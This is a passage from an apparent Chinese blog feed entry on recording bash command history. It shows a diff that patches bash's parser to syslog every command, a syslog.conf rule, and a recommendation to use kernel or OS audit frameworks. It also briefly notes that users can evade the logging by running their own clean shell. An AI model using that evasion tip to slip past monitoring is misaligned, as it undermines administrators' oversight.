plain">b </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">c </span><span class="token operator" style="color:#393A34">~</span><span class="token operator" style="color:#393A34">/</span><span class="token plain">bash</span><span class="token operator" style="color:#393A34">-</span><span class="token number" style="color:#36acaa">3.2</span><span class="token operator" style="color:#393A34">/</span><span class="token plain">parse</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">y </span><span class="token operator" style="color:#393A34">~</span><span class="token operator" style="color:#393A34">/</span><span class="token plain">hacked_bash</span><span class="token operator" style="color:#393A34">/</span><span class="token plain">parse</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">y</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">.</span><span class="token operator" style="color:#393A34">/</span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">.</span><span class="token operator" style="color:#393A34">/</span><span class="token plain">bash</span><span class="token operator" style="color:#393A34">-</span><span class="token number" style="color:#36acaa">3.2</span><span class="token operator" style="color:#393A34">/</span><span class="token plain">bash</span><span class="token operator" style="color:#393A34">-</span><span class="token number" style="color:#36acaa">3.2</span><span class="token operator" style="color:#393A34">/</span><span class="token plain">parse</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">y Tue Sep </span><span class="token number" style="color:#36acaa">19</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">13</span><span class="token operator" style="color:#393A34">:</span><span class="token number" style="color:#36acaa">37</span><span class="token operator" style="color:#393A34">:</span><span class="token number" style="color:#36acaa">21</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">2006</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">— parse</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">y Sat Jul </span><span class="token number" style="color:#36acaa">12</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">18</span><span class="token operator" style="color:#393A34">:</span><span class="token number" style="color:#36acaa">32</span><span class="token operator" style="color:#393A34">:</span><span class="token number" style="color:#36acaa">26</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">2008</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">*</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">19</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">24</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">*</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">— </span><span class="token number" style="color:#36acaa">19</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">25</span><span class="token plain"> —</span><span class="token operator" style="color:#393A34">-</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Foundation</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">59</span><span class="token plain"> Temple Place</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> Suite </span><span class="token number" style="color:#36acaa">330</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> Boston</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> MA </span><span class="token number" style="color:#36acaa">02111</span><span class="token plain"> USA</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">/</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">%</span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> #include #include “config</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">h”</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property directive keyword" style="color:#00009f">include</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property expression" style="color:#36acaa">“bashtypes</span><span class="token macro property expression punctuation" style="color:#393A34">.</span><span class="token macro property expression" style="color:#36acaa">h” </span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1979</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">1984</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> — </span><span class="token number" style="color:#36acaa">1980</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">1986</span><span class="token plain"> —</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain"> shell_input_line_len </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> i</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">/* == strlen (shell_input_line) */</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token function" style="color:#d73a49">set_line_mbstate</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">syslog</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">LOG_LOCAL0 </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> LOG_CRIT</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> “</span><span class="token operator" style="color:#393A34">%</span><span class="token plain">s”</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> shell_input_line</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property directive keyword" style="color:#00009f">if</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property expression function" style="color:#d73a49">defined</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property expression punctuation" style="color:#393A34">(</span><span class="token macro property expression" style="color:#36acaa">HISTORY</span><span class="token macro property expression punctuation" style="color:#393A34">)</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property expression keyword" style="color:#00009f">if</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property expression punctuation" style="color:#393A34">(</span><span class="token macro property expression" style="color:#36acaa">remember_on_history </span><span class="token macro property expression operator" style="color:#393A34">&amp;&amp;</span><span class="token macro property expression" style="color:#36acaa"> shell_input_line </span><span class="token macro property expression operator" style="color:#393A34">&amp;&amp;</span><span class="token macro property expression" style="color:#36acaa"> shell_input_line</span><span class="token macro property expression punctuation" style="color:#393A34">[</span><span class="token macro property expression number" style="color:#36acaa">0</span><span class="token macro property expression punctuation" style="color:#393A34">]</span><span class="token macro property expression punctuation" style="color:#393A34">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>上面的调用产生了一条日志消息，此消息将被syslog根据LOG_CRIT级别送到local0的设备上。要让这个东东生效则还必须要在/etc/syslog.conf配置文件中加入一条：</p><p><code>local0.crit /var/log/hist.log</code></p><p>至此用户下达的每条指令都将躺在/var/log/hist.log里，这个日志文件一般情况下日有root用户有读权限。</p><p>要注意的是上面所提到的hack并不区分是否为不同用户的输入。要实现的话还有更多的事情需要做的。由于所有的命令都被记录下来，那么由shell脚本执行或启动bash时的配置文件执行所产生的垃圾信息也是会被记录下来的。</p><p>现在唯一剩下的问题是”上面的hack要怎样才能被攻破？”其实这相当滴简单：</p><p>—-&gt;编译或上传一个你自己的干净的bash或其他shell即可搞定。</p><p>由于上面的hack是在特定版本的基础上的所以你编译或上传的干净bash可能在他的系统上会运行失败。</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="五总结">五：总结<a class="hash-link" href="#五总结" title="标题的直接链接">​</a></h2><p>Bash 只是一个shell，并不是一个logging设备，而bash_history只是用来为用户提供点方便少敲几下键盘而已。毫不装逼的说一句所有使用它来当监控设备的做法都是白搭。如果你是个较真的系统管理员且确实需要监控用户的活动，那就写个内核模块记录所有用户的键盘记录，并根据uid或其他参数进行过滤。这个方法将会非常管用并且很难被攻破（只是很难不是没那可能）。</p><p>现在已经有Linux包括FreeBSD下的审计框架可供选择。在FreeBSD平台，由Robert Watson和TrustedBSD项目开发的审计框架是选择之一。在linux平台，由来自红帽的Steve Grubb开发的Linux Auditing System也是一个选择：<a href="http://people.redhat.com/sgrubb/audit/" target="_blank" rel="noopener noreferrer">http://people.redhat.com/sgrubb/audit/</a></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="六参考资料">六：参考资料<a class="hash-link" href="#六参考资料" title="标题的直接链接">​</a></h2><ul><li><p>[1]<!-- --> bash &amp; syslog man pages</p></li><li><p>[2]<!-- --> bash-3.2 source code -<a href="http://ftp.gnu.org/gnu/bash/bash-3.2.tar.gz" target="_blank" rel="noopener noreferrer">http://ftp.gnu.org/gnu/bash/bash-3.2.tar.gz</a></p></li></ul>]]></content>
        <category label="bash" term="bash"/>
        <category label="hitory logging" term="hitory logging"/>
    </entry>
</feed>